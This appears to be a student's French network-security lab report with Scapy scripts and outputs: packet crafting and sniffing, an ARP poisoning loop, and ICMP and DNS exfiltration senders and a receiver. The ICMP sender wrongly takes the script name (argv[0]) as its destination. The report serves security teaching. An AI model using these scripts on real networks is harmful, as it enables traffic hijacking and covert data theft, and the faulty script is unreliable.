# TP4 SECU : Exfiltration

# Sommaire

- [TP4 SECU : Exfiltration](#tp4-secu--exfiltration)
- [Sommaire](#sommaire)
- [0. Setup](#0-setup)
- [I. Getting started Scapy](#i-getting-started-scapy)
- [II. ARP Poisoning](#ii-arp-poisoning)
- [II. Exfiltration ICMP](#ii-exfiltration-icmp)
- [III. Exfiltration DNS](#iii-exfiltration-dns)

# 0. Setup

# I. Getting started Scapy

🌞 **`ping.py`**

```python
from scapy.all import *

ping = ICMP(type=8)
packet = IP(src="10.1.1.101", dst="10.33.76.182")
frame = Ether(src="08:00:27:41:3e:fd", dst="08:00:27:98:a5:d6")

final_frame = frame/packet/ping
answers, unanswered_packets = srp(final_frame, timeout=10)

print(f"Pong reçu : {answers[0]}")
```

```cmd
┌──(quentin㉿kali)-[~/Documents/TP4-reseaux]
└─$ sudo python3 ping.py                                   
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
Pong reçu : QueryAnswer(query=<Ether  dst=08:00:27:98:a5:d6 src=08:00:27:41:3e:fd type=IPv4 |<IP  frag=0 proto=icmp src=10.1.1.101 dst=10.33.76.182 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=08:00:27:54:fe:17 src=52:54:00:12:35:02 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=2044 flags= frag=0 ttl=127 proto=icmp chksum=0xd1a8 src=10.33.76.182 dst=10.1.1.101 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>>)
```

🌞 **`tcp_cap.py`**

- fonction `sniff()`
- capture le premier TCP SYN ACK reçu

```python
from scapy.all import sniff

def print_it_please(packet):
    packet_source_ip = packet['IP'].src
    packet_dest_ip = packet['IP'].dst
    port_dst = packet['TCP'].dport
    port_src = packet['TCP'].sport
    print(f"TCP SYN ACK reçu !")
    print(f"- Adresse IP src : {packet_source_ip}")
    print(f"- Adresse IP dst : {packet_dest_ip}")
    print(f"- Port TCP src : {port_src}")
    print(f"- Port TCP dst : {port_dst}")

sniff(filter="tcp and tcp[tcpflags] == (tcp-syn + tcp-ack)", prn=print_it_please, count=1)
```

```cmd
└─$ sudo python3 tpc_cap.py
TCP SYN ACK reçu !
- Adresse IP src : 54.248.234.59
- Adresse IP dst : 10.0.2.15
- Port TCP src : 80
- Port TCP dst : 39604
```

🌞 **`dns_cap.py`**

- fonction `sniff()`
- capturer une requête DNS et sa réponse
  - une requête DNS pour connaître l'IP de `ynov.com`

```python
from scapy.all import sniff, DNS

def print_it_please(packet):
    if DNS in packet and packet[DNS].qr == 1:
        dns_answers = packet[DNS].an
        for answer in dns_answers:
            if answer.type == 1:
                ip_address = answer.rdata
                print(ip_address)

sniff(filter="udp and port 53", prn=print_it_please, count=2)

```

🌞 **`dns_lookup.py`**

- craftez une requête DNS à la main

```python
from scapy.all import IP, srp, Ether, UDP, DNS, DNSQR

dns_request = Ether()/IP(dst='8.8.8.8')/ UDP() /DNS(rd=1,qd=DNSQR(qname="www.ynov.com"))

result = srp(dns_request, timeout=2, verbose=True)
response , _ = result
print(response.show())
```

# II. ARP Poisoning

🌞 **`arp_poisoning.py`**

- craftez une trame ARP qui empoisonne la table d'un voisin
  - je veux que, pour la victime, l'adresse IP `10.13.33.37` corresponde à la MAC `de:ad:be:ef:ca:fe`

```python
from scapy.all import ARP, send

def poison():
    VictimeIP = "10.13.33.51"
    VictimeMac = "08:00:27:a1:6c:cf"
    PoisonnedIP = "10.13.33.37"
    PoisonnedMac = "de:ad:be:ef:ca:fe"
    send(ARP(op = 2, pdst = VictimeIP, psrc = PoisonnedIP, hwdst= VictimeMac, hwsrc= PoisonnedMac))

while True:
    poison()
```

```cmd
[quentin@localhost ~]$ ip n s
10.13.33.37 dev enp0s8 lladdr de:ad:be:ef:ca:fe REACHABLE
```

# II. Exfiltration ICMP

🌞 **`icmp_exf_send.py`**

- envoie un caractère passé en argument dans un ping
  - un seul caractère pour le moment
- l'IP destination est aussi passée en argument

```python
from scapy.all import *
from scapy.all import IP, ICMP
from sys import argv

packet = IP(dst=argv[0])/ICMP()/str(argv[1])
send(packet)
```

🌞 **`icmp_exf_receive.py`**

- sniff le réseau
- affiche **UNIQUEMENT** le caractère caché si un paquet ICMP d'exfiltration est reçu et quitte après réception de 1 paquet
- si un ping legit est reçu, ou n'importe quoi d'autre votre code doit continuer à tourner

```python
from scapy.all import sniff

def print_it_please(packet):
    if (packet['ICMP'].type == 8 and len(packet['Raw'].load) == 1):
        print(packet['Raw'].load)
        quit()

sniff(filter="icmp", prn=print_it_please, count=0)
```

# III. Exfiltration DNS

🌞 **`dns_exfiltration_send.py`**

- envoie des données passées en argument à l'IP passée en argument
- utilise le protocole DNS pour exfiltrer lesdites données
- une string de 20 caractères doit pouvoir être exfiltrée

```python
from scapy.all import srp, DNS, IP, UDP, Ether, DNSQR
from sys import argv

def dns_sender(message):
    target = argv[1]
    dns_pkt = Ether() / IP(dst=target) / UDP(dport=53) / DNS(qd=DNSQR(qname=message))
    ans, unans = srp(dns_pkt, timeout=2, verbose=True)

for i in range(0, len(argv[2]), 20):
        substring = argv[2][i:i + 20]
        dns_sender(substring)
```